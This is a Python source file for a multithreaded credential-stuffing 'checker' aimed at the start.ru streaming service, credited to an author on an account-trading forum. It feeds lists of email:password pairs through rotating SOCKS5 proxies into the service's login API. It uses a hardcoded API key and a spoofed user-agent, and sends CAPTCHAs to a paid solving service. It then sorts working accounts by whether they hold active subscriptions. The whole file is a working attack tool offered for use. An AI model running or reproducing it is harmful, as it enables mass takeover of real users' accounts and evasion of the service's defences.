import base64
import io
import uuid

import datetime
from datetime import datetime
from colorama import init, Fore, Style
from config import *

import threading
import queue

import httpx



init(autoreset=True)

account_queue = queue.Queue()
proxy_queue = queue.Queue()

def load_accounts():
    with open('accounts.txt', 'r') as file:
        for line in file:
            account_queue.put(line.strip())

def load_proxies():
    with open('proxies.txt', 'r') as file:
        for line in file:
            proxy_queue.put(line.strip())

def is_proxy_valid(proxy):
    try:
        response = httpx.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
        response.raise_for_status()
        return True
    except (httpx.RequestError, httpx.HTTPStatusError):
        return False

def get_proxy():
    while True:
        if not proxy_queue.empty():
            proxy_str = proxy_queue.get().strip()
            ip, port, username, password = proxy_str.split(':')

            proxy = {
                "http://": f"socks5://{username}:{password}@{ip}:{port}",
            }

            if is_proxy_valid(proxy):
                return proxy
            else:
                return get_proxy()
        else:
            load_proxies()
            continue


def captcha_solver(url, account, proxy):
    print(f"{Style.BRIGHT}{Fore.YELLOW}Solving captcha | {account}")

    url = 'https://api.start.ru' + url


    with httpx.Client(proxies=proxy) as client:
        try:
            response = client.get(url)
        except httpx.HTTPStatusError as e:
            print(f"{Style.BRIGHT}{Fore.RED}HTTP error: {e.response.status_code} for {account}")
            return None
        except httpx.RequestError as e:
            print(f"{Style.BRIGHT}{Fore.RED}request error: {e} for {account}")
            return None

    image_io = io.BytesIO(response.content)
    ee = base64.b64encode(image_io.getvalue()).decode('utf-8')

    payload = {
        'clientKey': key,
        'task': {
            'type': 'ImageToTextTask',
            'body': ee,
            'phrase': False,
            'case': False,
            'numeric': 0,
            'math': 0,
            'minLength': 0,
            'maxLength': 0
        }
    }
    headers = {'Content-Type': 'application/json'}

    with httpx.Client(proxies=proxy) as client:
        try:
            r = client.post("https://api.anti-captcha.com/createTask", json=payload, headers=headers)
            r.raise_for_status()
            r = r.json()
        except httpx.HTTPStatusError as e:
            print(f"{Style.BRIGHT}{Fore.RED}HTTP error: {e.response.status_code} for {account}")
            return None
        except httpx.RequestError as e:
            print(f"{Style.BRIGHT}{Fore.RED}request error: {e} for {account}")
            return None


    taskId = r.get('taskId')
    if not taskId:
        print(f"{Style.BRIGHT}{Fore.RED}Ошибка при создании задачи капчи для {account}.")
        return None

    while True:
        result = captcha_wait(taskId, proxy)
        if result:
            print(f"{Style.BRIGHT}{Fore.CYAN}Solved captcha | {account}")
            return result

def captcha_wait(taskId, proxy):
    threading.Event().wait(1)
    headers = {'Content-Type': 'application/json'}
    payload = {'clientKey': key, 'taskId': taskId}

    with httpx.Client(proxies=proxy) as client:
        try:
            r = client.post("https://api.anti-captcha.com/getTaskResult", json=payload, headers=headers, timeout=30)
            return r.json().get('solution', {}).get('text')
        except httpx.HTTPStatusError as e:
            print(f"{Style.BRIGHT}{Fore.RED}HTTP error: {e.response.status_code}")
            return None
        except httpx.RequestError as e:
            print(f"{Style.BRIGHT}{Fore.RED}request error: {e}")
            return None

def worker():
    while True:
        account = account_queue.get()
        if account is None:
            break

        proxy = get_proxy()
        if proxy is None:
            account_queue.put(account)
            continue

        parts = account.split(':')
        if len(parts) == 2:
            username, password = parts
            password_base64 = base64.b64encode(password.encode('utf-8')).decode('utf-8')

            captcha = False
            url_captcha = None
            solution_captcha = None
            key_captcha = None

            while True:
                if captcha and solution_captcha:
                    payload = {
                        'captcha': solution_captcha,
                        "password": password_base64,
                        "device_id": str(uuid.getnode()),
                        "device_type": "web",
                        "client_platform": "start",
                        "email": username,
                        "is_encoded": True,
                        'key': key_captcha
                    }
                else:
                    payload = {
                        "password": password_base64,
                        "device_id": str(uuid.getnode()),
                        "device_type": "web",
                        "client_platform": "start",
                        "email": username,
                        "is_encoded": True
                    }

                url = "https://api.start.ru/v2/auth/email/login?apikey=a20b12b279f744f2b3c7b5c5400c4eb5"

                with httpx.Client(proxies=proxy) as client:
                        response = client.post(
                            url,
                            json=payload,
                            headers={
                                "Content-Type": "application/json",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                            }
                        )
                        json_response = response.json()

                        if response.status_code == 400:
                            data = json_response.get('data', {})
                            url_captcha = data.get('captcha')
                            key_captcha = data.get('key')

                            if url_captcha is not None and key_captcha is not None:
                                solution_captcha = captcha_solver(url_captcha, account, proxy)
                                captcha = True
                            else:
                                print(f"{Style.BRIGHT}{Fore.RED}[-] Invalid | {account}")
                                with open('Result/Invalids.txt', 'a') as file:
                                    file.write(account + '\n')
                                    break

                        else:
                            sub_account = False
                            subscriptions = json_response.get("subscriptions", [])

                            if subscriptions:
                              subscription = subscriptions[0]
                              expiration_timestamp = subscription.get("expiration")
                              expiration_date = datetime.fromtimestamp(expiration_timestamp)
                              expiration_date = expiration_date.strftime('%Y-%m-%d')
                              sub_account = f'True({expiration_date})'

                            print(f"{Style.BRIGHT}{Fore.GREEN}[+] Valid - {account} | Subscribe: {sub_account}")
                            if sub_account is not False:
                              with open('Result/Valids_Sub.txt', 'a') as file:
                                file.write(account + '\n')
                            else:
                              with open('Result/Valids_NoSub.txt', 'a') as file:
                                file.write(account + '\n')
                            break


def main():
        print(f"{Style.BRIGHT}{Fore.LIGHTWHITE_EX}start.ru checker by Getrequest - lolz.live/getrequest\n")

        load_accounts()
        load_proxies()

        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=worker)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
        main()